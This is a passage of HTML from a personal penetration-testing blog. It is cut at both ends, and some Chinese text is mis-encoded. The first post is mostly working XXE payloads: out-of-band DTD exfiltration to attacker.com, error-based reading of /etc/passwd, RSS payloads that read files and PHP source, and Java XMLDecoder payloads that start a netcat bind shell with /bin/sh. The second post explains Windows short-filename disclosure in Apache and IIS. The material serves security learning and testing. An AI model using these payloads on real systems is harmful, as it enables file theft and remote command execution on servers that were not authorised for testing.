<h3 id="Exfiltrating-Data-via-Out-of-Band"><a href="#Exfiltrating-Data-via-Out-of-Band" class="headerlink" title="Exfiltrating Data via Out of Band"></a>Exfiltrating Data via Out of Band</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>Based on the displayed User Agent returned by burp collaborator, it appears that it is using <strong>Java 1.8</strong>. One of the problems when exploiting XXE on this version of Java is <strong>weâ€™re unable to obtain the files containing a <code>New Line</code></strong> such as <code>/etc/passwd</code> using the Out of Band technique.</p>
<h3 id="Exfiltrating-Data-via-Error-Based"><a href="#Exfiltrating-Data-via-Error-Based" class="headerlink" title="Exfiltrating Data via Error Based"></a>Exfiltrating Data via Error Based</h3><p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>Server Response:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;IO error.\nReason: /nofile (No such file or directory)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Great! The <code>non-exist</code> file is reflected in the Error messages. Next is adding the File Content.</p>
<p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>And the content of the file was successfully <strong>printed in the output of the error sent via HTTP</strong>.</p>
<h2 id="RSS-XEE"><a href="#RSS-XEE" class="headerlink" title="RSS - XEE"></a>RSS - XEE</h2><p>å…·æœ‰ RSS æ ¼å¼çš„æœ‰æ•ˆ XML ä»¥åˆ©ç”¨ XXE æ¼æ´ã€‚</p>
<h3 id="Ping-back"><a href="#Ping-back" class="headerlink" title="Ping back"></a>Ping back</h3><p>Simple HTTP request to attackers server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://&lt;AttackIP&gt;/rssXXE&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;XXE Test Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;XXE Test Blog&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;Test Post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-file"><a href="#Read-file" class="headerlink" title="Read file"></a>Read file</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-source-code"><a href="#Read-source-code" class="headerlink" title="Read source code"></a>Read source code</h3><p>Using PHP base64 filter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Java-XMLDecoder-XEE-to-RCE"><a href="#Java-XMLDecoder-XEE-to-RCE" class="headerlink" title="Java XMLDecoder XEE to RCE"></a>Java XMLDecoder XEE to RCE</h2><p>XMLDecoder æ˜¯ä¸€ä¸ªåŸºäº XML æ¶ˆæ¯åˆ›å»ºå¯¹è±¡çš„ Java ç±»ã€‚å¦‚æœæ¶æ„ç”¨æˆ·å¯ä»¥åœ¨è°ƒç”¨<strong>readObject</strong>æ–¹æ³•æ—¶è®©åº”ç”¨ç¨‹åºä½¿ç”¨ä»»æ„æ•°æ®ï¼Œå°†å¯åœ¨æœåŠ¡å™¨ä¸Šçš„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="Using-Runtime-exec"><a href="#Using-Runtime-exec" class="headerlink" title="Using Runtime().exec()"></a>Using Runtime().exec()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line"> &lt;object class=&quot;java.lang.Runtime&quot; method=&quot;getRuntime&quot;&gt;</span><br><span class="line">      &lt;void method=&quot;exec&quot;&gt;</span><br><span class="line">      &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">          &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">              &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">              &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">              &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">              &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">              &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">              &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">      &lt;/array&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line"> &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">    &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">        &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">         &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">         &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">         &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">         &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">         &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">    &lt;/array&gt;</span><br><span class="line">    &lt;void method=&quot;start&quot; id=&quot;process&quot;&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>embed url&#x3D;â€<a target="_blank" rel="noopener" href="https://github.com/luisfontes19/xxexploiter&quot;">https://github.com/luisfontes19/xxexploiter&quot;</a> </p>
<h2 id="More-resources"><a href="#More-resources" class="headerlink" title="More resources"></a>More resources</h2><p><a target="_blank" rel="noopener" href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a><br><a target="_blank" rel="noopener" href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a><br>Extract info via HTTP using own external DTD: <a target="_blank" rel="noopener" href="https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/">https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/</a><br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a><br><a target="_blank" rel="noopener" href="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9">https:&#x2F;&#x2F;medium.com&#x2F;@onehackman&#x2F;exploiting-xml-external-entity-xxe-injections-b0e3eac388f9</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a><br><a target="_blank" rel="noopener" href="https://gosecure.github.io/xxe-workshop/#7">https://gosecure.github.io/xxe-workshop/#7</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">æ¸—é€æµ‹è¯•ä¹‹çŸ­æ–‡ä»¶åæ¼æ´</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-26 02:33:52" itemprop="dateCreated datePublished" datetime="2022-03-26T02:33:52+08:00">2022-03-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-07 22:15:10" itemprop="dateModified" datetime="2022-04-07T22:15:10+08:00">2022-04-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">æ¸—é€æµ‹è¯•</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ¸—é€æµ‹è¯•ä¹‹çŸ­æ–‡ä»¶åæ¼æ´"><a href="#æ¸—é€æµ‹è¯•ä¹‹çŸ­æ–‡ä»¶åæ¼æ´" class="headerlink" title="æ¸—é€æµ‹è¯•ä¹‹çŸ­æ–‡ä»¶åæ¼æ´"></a>æ¸—é€æµ‹è¯•ä¹‹çŸ­æ–‡ä»¶åæ¼æ´</h1><h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01-å‰è¨€"></a>0x01-å‰è¨€</h2><p>æŸæ¬¡æµ‹è¯•ï¼Œä½¿ç”¨ dirsearch å¯¹ç½‘ç«™ç›®å½•è¿›è¡Œæ‰«æï¼Œçªç„¶å‘ç°ä¸€ä¸ªç»ˆç«¯å‡ºç°ä¸€ä¸ªå¥‡æ€ªçš„è·¯å¾„ï¼š <code>index~1</code> ï¼Œä¸”å“åº”ç ä¸º 200ã€‚è®¿é—®åå‘ç°è¯¥æ–‡ä»¶ä¸º index å¤‡ä»½æ–‡ä»¶ï¼Œæµè§ˆå™¨ç›´æ¥æ˜¾ç¤ºæ–‡ä»¶æºç ã€‚çœŸå¥‡æ€ªå•Šï¼ŒçœŸå¥‡æ€ªã€‚åé¢ç™¾åº¦å‘ç°ï¼Œ<code>Apache + Windows</code> ç»„åˆï¼Œä¼šå­˜åœ¨çŸ­æ–‡ä»¶åä¸‹è½½æ¼æ´ã€‚å‚è€ƒç½‘ä¸Šå†…å®¹ï¼Œæ•´ç†åˆå¹¶èµ„æ–™ï¼Œé‚æœ‰ä¸‹æ–‡ã€‚</p>
<h2 id="0x02-Windows-Apache-x3D-çŸ­æ–‡ä»¶åä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#0x02-Windows-Apache-x3D-çŸ­æ–‡ä»¶åä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x02-Windows + Apache &#x3D; çŸ­æ–‡ä»¶åä»»æ„æ–‡ä»¶ä¸‹è½½"></a>0x02-Windows + Apache &#x3D; çŸ­æ–‡ä»¶åä»»æ„æ–‡ä»¶ä¸‹è½½</h2><p>Windowsä¸‹é‡‡ç”¨äº†çŸ­æ–‡ä»¶åæœºåˆ¶ï¼Œå¦‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\wooyun12312394944545.txt</span><br></pre></td></tr></table></figure>

<p>å¯é‡‡ç”¨å¦‚ä¸‹æ–¹å¼è®¿é—®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\wooyun~1.txt</span><br></pre></td></tr></table></figure>

<p>å‡å¦‚webåº”ç”¨ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶åæ˜¯è¿™æ ·çš„ï¼š<code>http://127.0.0.1/admin/databack/sql/metinfo_met_20140202_ixzlfo_1.zip</code>ã€‚å½“ç›®æ ‡ç«™ç‚¹ä¸º windows + apache(å½±å“ç‰ˆæœ¬èŒƒå›´ä¸ç¡®è®¤ï¼Œç½‘ä¸Šè¯´ Apache æœåŠ¡å™¨é»˜è®¤æ”¯æŒçŸ­æ–‡ä»¶åè®¿é—®) çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡çŸ­æ–‡ä»¶åçš„æ–¹å¼ç›´æ¥ä¸‹è½½æ–‡ä»¶ï¼š<code>http://127.0.0.1/admin/databack/sql/metinf~1.zip</code></p>
<p><strong>æ¼æ´è¯æ˜ï¼š</strong></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220324165011.png"></p>
<p><em>PS : IIS ä¸‹ä¸å…è®¸ä½¿ç”¨çŸ­æ–‡ä»¶æ¥è®¿é—®èµ„æºï¼Œè€Œ Apache æ”¯æŒçŸ­æ–‡ä»¶åæ¥è®¿é—®èµ„æºï¼Œå› æ­¤ä¸Šé¢ä»‹ç»çš„ä»»æ„æ–‡ä»¶ä¸‹è½½åªèƒ½é€‚åº”äº windows ç³»ç»Ÿä¸‹çš„ Apache æ­å»ºçš„ç½‘ç«™ä¸­ï¼ˆTomcat ä¹Ÿä¸æ”¯æŒä½¿ç”¨çŸ­æ–‡ä»¶åæ¥è®¿é—®èµ„æºï¼‰ã€‚IIS ä¸­è™½ç„¶ä¸èƒ½åˆ©ç”¨çŸ­æ–‡ä»¶åæ¥è®¿é—®èµ„æºï¼Œä½†æ˜¯å­˜åœ¨ IIS çŸ­æ–‡ä»¶æ³„éœ²æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨çŸ­æ–‡ä»¶åæ¥çŒœæµ‹ç½‘ç«™ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•å</em></p>
<h2 id="0x03-IIS-çŸ­æ–‡ä»¶å"><a href="#0x03-IIS-çŸ­æ–‡ä»¶å" class="headerlink" title="0x03-IIS çŸ­æ–‡ä»¶å"></a>0x03-IIS çŸ­æ–‡ä»¶å</h2><h3 id="IISçŸ­æ–‡ä»¶æ¼æ´çš„ç”±æ¥"><a href="#IISçŸ­æ–‡ä»¶æ¼æ´çš„ç”±æ¥" class="headerlink" title="IISçŸ­æ–‡ä»¶æ¼æ´çš„ç”±æ¥"></a>IISçŸ­æ–‡ä»¶æ¼æ´çš„ç”±æ¥</h3><p>Microsoft IIS çŸ­æ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹åç§°ä¿¡æ¯æ³„æ¼æœ€å¼€å§‹ç”±Vulnerability Research Teamï¼ˆæ¼æ´ç ”ç©¶å›¢é˜Ÿï¼‰çš„Soroush Daliliåœ¨2010å¹´8æœˆ1æ—¥å‘ç°ï¼Œå¹¶äº2010å¹´8æœˆ3æ—¥é€šçŸ¥ä¾›åº”å•†ï¼ˆå¾®è½¯å…¬å¸ï¼‰ã€‚å¾®è½¯å…¬å¸åˆ†åˆ«äº2010å¹´12æœˆ1æ—¥å’Œ2011å¹´1æœˆ4æ—¥ç»™äºˆç­”å¤ä¸‹ä¸ªç‰ˆæœ¬ä¿®å¤ã€‚2012å¹´6æœˆ29æ—¥ï¼Œæ­¤æ¼æ´å…¬å¼€æŠ«éœ²ï¼ˆä¸­å±ï¼‰ã€‚</p>
<p>æ­¤æ¼æ´å®é™…æ˜¯ç”±HTTPè¯·æ±‚ä¸­æ—§ <code>DOS 8.3</code> åç§°çº¦å®šï¼ˆSFNï¼‰çš„ä»£å­—ç¬¦ï¼ˆ<code>ã€œ</code>ï¼‰æ³¢æµªå·å¼•èµ·çš„ã€‚å®ƒå…è®¸è¿œç¨‹æ”»å‡»è€…åœ¨Webæ ¹ç›®å½•ä¸‹å…¬å¼€æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åç§°ï¼ˆä¸åº”è¯¥å¯è¢«è®¿é—®ï¼‰ã€‚æ”»å‡»è€…å¯ä»¥æ‰¾åˆ°é€šå¸¸æ— æ³•ä»å¤–éƒ¨ç›´æ¥è®¿é—®çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è·å–æœ‰å…³åº”ç”¨ç¨‹åºåŸºç¡€ç»“æ„çš„ä¿¡æ¯ã€‚</p>
<p>Microsoft IIS æ³¢æµªå·é€ æˆçš„ä¿¡æ¯æ³„éœ²æ˜¯ä¸–ç•Œç½‘ç»œèŒƒå›´å†…æœ€å¸¸è§çš„ä¸­ç­‰é£é™©æ¼æ´ã€‚è¿™ä¸ªé—®é¢˜è‡³å°‘ä»1990å¹´å¼€å§‹å°±å·²ç»å­˜åœ¨ï¼Œä½†æ˜¯å·²ç»è¯æ˜éš¾ä»¥å‘ç°ï¼Œéš¾ä»¥è§£å†³æˆ–å®¹æ˜“è¢«å®Œå…¨å¿½ç•¥ã€‚</p>
<h3 id="IISçŸ­æ–‡ä»¶æ¼æ´å½±å“èŒƒå›´åŠå±å®³"><a href="#IISçŸ­æ–‡ä»¶æ¼æ´å½±å“èŒƒå›´åŠå±å®³" class="headerlink" title="IISçŸ­æ–‡ä»¶æ¼æ´å½±å“èŒƒå›´åŠå±å®³"></a>IISçŸ­æ–‡ä»¶æ¼æ´å½±å“èŒƒå›´åŠå±å®³</h3><h4 id="å—å½±å“çš„ç‰ˆæœ¬"><a href="#å—å½±å“çš„ç‰ˆæœ¬" class="headerlink" title="å—å½±å“çš„ç‰ˆæœ¬"></a>å—å½±å“çš„ç‰ˆæœ¬</h4><blockquote>
<p>IIS 1.0ï¼ŒWindows NT 3.51<br>IIS 3.0ï¼ŒWindows NT 4.0 Service Pack 2<br>IIS 4.0ï¼ŒWindows NT 4.0é€‰é¡¹åŒ…<br>IIS 5.0ï¼ŒWindows 2000<br>IIS 5.1ï¼ŒWindows XP Professionalå’ŒWindows XP Media Center Edition<br>IIS 6.0ï¼ŒWindows Server 2003å’ŒWindows XP Professional x64 Edition<br>IIS 7.0ï¼ŒWindows Server 2008å’ŒWindows Vista<br>IIS 7.5ï¼ŒWindows 7ï¼ˆè¿œç¨‹å¯ç”¨<customErrors>æˆ–æ²¡æœ‰web.configï¼‰<br>IIS 7.5ï¼ŒWindows 2008ï¼ˆç»å…¸ç®¡é“æ¨¡å¼ï¼‰<br>IIS 8.0ï¼ŒWindows 8, Windows Server 2012<br>IIS 8.5ï¼ŒWindows 8.1,Windows Server 2012 R2<br>IIS 10.0ï¼ŒWindows 10, Windows Server 2016</p>
</blockquote>
